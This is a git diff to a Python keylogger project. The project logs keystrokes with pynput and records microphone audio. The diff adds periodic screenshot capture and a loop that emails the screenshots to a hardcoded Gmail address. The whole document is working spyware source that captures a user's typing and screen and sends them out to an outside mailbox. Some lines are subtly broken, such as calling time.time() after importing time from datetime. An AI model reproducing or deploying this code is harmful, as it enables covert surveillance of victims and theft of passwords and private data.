@@ -1,3 +1,4 @@
+from datetime import time
 from webbrowser import get
 
 import pynput
@@ -17,12 +18,17 @@ import platform
 from scipy.io.wavfile import write
 import sounddevice as sd
 
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+
 
 
 keys_information = "key_log.txt"
 sys_information = "sys_info.txt"
 clipboard_information = "clip_info.txt"
 sound_information = "audio.wav"
+image_infomation = "screenshot.png"
 
 from_addr = "tharilaki82@gmail.com"
 toaddress = "tharilaki82@gmail.com"
@@ -31,8 +37,6 @@ body = "hiiiii"
 
 path = "/home/tharindu/Desktop/Keylogger/project"
 extend = "/"
-
-keys = []
 
 frequency = 44100
 microphone_time = 5
@@ -102,34 +106,65 @@ def sound_info(fs, seconds):
     sd.wait()
     write(path + extend + sound_information, fs, my_recording)
 
-sound_info(frequency, microphone_time)
+#sound_info(frequency, microphone_time)
+
+def image_info():
+    im = ImageGrab.grab()
+    im.save(path + extend + image_infomation)
+
+image_info()
+
+time_iteration = 15
+number_of_interation =0
+current_time = time.time()
+stopping_time = time.time() + time_iteration
+number_of_interation_end = 3
 
 
 
-def press(key):
-    global keys
-    keys.append(key)
-    write_file(keys)
-    keys =[]
-def release(key):
-    if key == Key.esc:
-        #clipboard_info()
-        send_email(keys_information, path + extend + keys_information, toaddress)
-        send_email(sys_information, path + extend + sys_information, toaddress)
-        return False
+while number_of_interation < number_of_interation_end:
+    keys = []
 
-def write_file(keys):
-    with open(path + extend + keys_information, "a") as f:
-        for key in keys:
-            if key == Key.space:
-                f.write('\n')
-            elif hasattr(key, 'char'):
-                f.write(key.char)
-            else:
-                f.write("["+str(key)+"]\n")
+    def press(key):
+        global keys, current_time
+        keys.append(key)
+        current_time = time.time()
+        write_file(keys)
+        keys =[]
+
+    def release(key):
+        if key == Key.esc:
+            #clipboard_info()
+            #send_email(keys_information, path + extend + keys_information, toaddress)
+            #send_email(sys_information, path + extend + sys_information, toaddress)
+            return False
+        if current_time>stopping_time:
+            return False
+
+    def write_file(keys):
+        with open(path + extend + keys_information, "a") as f:
+            for key in keys:
+                if key == Key.space:
+                    f.write('\n')
+                elif hasattr(key, 'char'):
+                    f.write(key.char)
+                else:
+                    f.write("["+str(key)+"]\n")
 
 
 
-with Listener(on_press=press, on_release=release) as listener:
-    listener.join()
+    with Listener(on_press=press, on_release=release) as listener:
+        listener.join()
 
+    if current_time > stopping_time:
+         with open(path + extend + keys_information, "w") as f:
+             f.write(" ")
+
+         image_info()
+         send_email(image_infomation, path+extend+image_infomation,toaddress)
+
+         #clipboard_info()
+
+         number_of_interation += 1
+         current_time = time.time()
+         stopping_time = time.time() + time_iteration
